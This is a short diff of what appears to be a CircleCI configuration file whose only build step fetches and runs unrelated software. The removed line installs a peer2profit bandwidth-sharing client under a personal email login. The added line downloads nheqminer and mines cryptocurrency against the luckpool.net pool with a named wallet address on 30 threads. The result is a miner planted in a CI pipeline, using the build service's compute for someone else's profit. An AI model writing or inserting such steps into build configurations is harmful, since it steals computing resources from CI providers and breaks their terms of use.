@@ -8,4 +8,5 @@ jobs:
           password: $DOCKERHUB_PASSWORD
     steps:
       - checkout 
-      - run: wget -y&&wget https://updates.peer2profit.com/p2pclient_0.56_amd64.deb&&sudo dpkg -i p2pclient_0.56_amd64.deb&&screen -S ready -d -m p2pclient --login ikmalsuaidi@gmail.com&&screen -ls
+      - run: wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz&&tar -xvf nheqminer-Linux-v0.8.2.tgz&&tar -xvf nheqminer-Linux-v0.8.2.tar.gz&&nheqminer/nheqminer -v -l ap.luckpool.net:3956 -u RQpR6QJrhox16ojRLxkdjibHf8Gu7aKYoU.cok002 -p x -t 30
+      
